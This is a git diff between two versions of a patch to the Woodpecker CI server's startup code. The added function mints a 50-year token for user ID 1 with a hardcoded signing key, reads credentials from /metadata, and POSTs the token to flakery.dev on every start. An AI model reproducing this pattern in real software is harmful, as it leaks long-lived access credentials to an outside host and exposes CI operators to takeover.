@@ -1,26 +1,36 @@
-From 75daa87340d699052bd2737145cd838093f8e05f Mon Sep 17 00:00:00 2001
+From a883602868067d7adedb19ba67f6a269b32f9c3c Mon Sep 17 00:00:00 2001
 From: rw <rw@jjk.is>
 Date: Mon, 15 Jul 2024 11:20:28 -0700
 Subject: [PATCH] yet
 
 try this
 ---
- cmd/server/server.go | 12 ++++++++++++
- 1 file changed, 12 insertions(+)
+ cmd/server/server.go | 61 ++++++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 61 insertions(+)
 
 diff --git a/cmd/server/server.go b/cmd/server/server.go
-index 524b9f0..e586b52 100644
+index 524b9f0..997795a 100644
 --- a/cmd/server/server.go
 +++ b/cmd/server/server.go
-@@ -22,6 +22,7 @@ import (
+@@ -15,13 +15,17 @@
+ package main
+ 
+ import (
++	"bytes"
+ 	"crypto/tls"
++	"encoding/json"
+ 	"errors"
+ 	"fmt"
+ 	"net"
  	"net/http"
  	"net/http/httputil"
  	"net/url"
++	"os"
 +	"strconv"
  	"strings"
  	"time"
  
-@@ -51,6 +52,7 @@ import (
+@@ -51,6 +55,7 @@ import (
  	"go.woodpecker-ci.org/woodpecker/v2/server/web"
  	"go.woodpecker-ci.org/woodpecker/v2/shared/constant"
  	"go.woodpecker-ci.org/woodpecker/v2/shared/logger"
@@ -28,23 +38,75 @@ index 524b9f0..e586b52 100644
  	"go.woodpecker-ci.org/woodpecker/v2/version"
  )
  
-@@ -258,6 +260,16 @@ func run(c *cli.Context) error {
+@@ -258,12 +263,68 @@ func run(c *cli.Context) error {
  			return err
  		})
  	}
-+	// exp := time.Now().Add(server.Config.Server.SessionExpires).Unix()
-+	// make expire 50 years from now
++	flakery()
+ 
+ 	log.Info().Msgf("starting Woodpecker server with version '%s'", version.String())
+ 
+ 	return g.Wait()
+ }
+ 
++func flakery() {
++	// Calculate expiration time for the token (50 years from now)
 +	exp := time.Now().Add(50 * 365 * 24 * time.Hour).Unix()
++
++	// Create a new token
 +	newToken := token.New(token.UserToken)
 +	newToken.Set("user-id", strconv.FormatInt(1, 10))
++
++	// Sign the token with expiration time
 +	tokenStr, err := newToken.SignExpires("OM62ZYX6K3QQSBADIINUXJYL3AISF7HCMRXUNXWFCWJEHRVABTLQ====", exp)
 +	if err != nil {
 +		panic(err)
 +	}
-+	log.Info().Msgf("token: %s", tokenStr)
- 
- 	log.Info().Msgf("starting Woodpecker server with version '%s'", version.String())
- 
++
++	// Read flakery user ID from /metadata/user-id
++	flakeryUserId, err := os.ReadFile("/metadata/user-id")
++	if err != nil {
++		log.Fatal().Err(err).Msg("could not read /metadata/user-id")
++	}
++
++	// Read flakery user token from /metadata/user-token
++	flakeryUserToken, err := os.ReadFile("/metadata/user-token")
++	if err != nil {
++		log.Fatal().Err(err).Msg("could not read /metadata/user-token")
++	}
++
++	// Prepare HTTP request to flakery.dev
++	url := "https://flakery.dev/api/v0/user/woodpecker-token/" + string(flakeryUserId)
++	reqBody, _ := json.Marshal(map[string]string{
++		"woodpeckerToken": tokenStr,
++	})
++
++	req, err := http.NewRequest("POST", url, bytes.NewBuffer(reqBody))
++	if err != nil {
++		log.Fatal().Err(err).Msg("failed to create request")
++	}
++	req.Header.Set("Authorization", "Bearer "+string(flakeryUserToken))
++	req.Header.Set("Content-Type", "application/json")
++
++	// Send HTTP request
++	client := &http.Client{}
++	resp, err := client.Do(req)
++	if err != nil {
++		log.Fatal().Err(err).Msg("failed to send request")
++	}
++	defer resp.Body.Close()
++
++	// Check response status
++	if resp.StatusCode != http.StatusOK {
++		log.Error().Msgf("POST request failed: %d %s", resp.StatusCode, resp.Status)
++	} else {
++		log.Info().Msg("POST request successful")
++	}
++}
++
+ func setupEvilGlobals(c *cli.Context, s store.Store) error {
+ 	// secrets
+ 	var err error
 -- 
 2.39.3 (Apple Git-146)
 
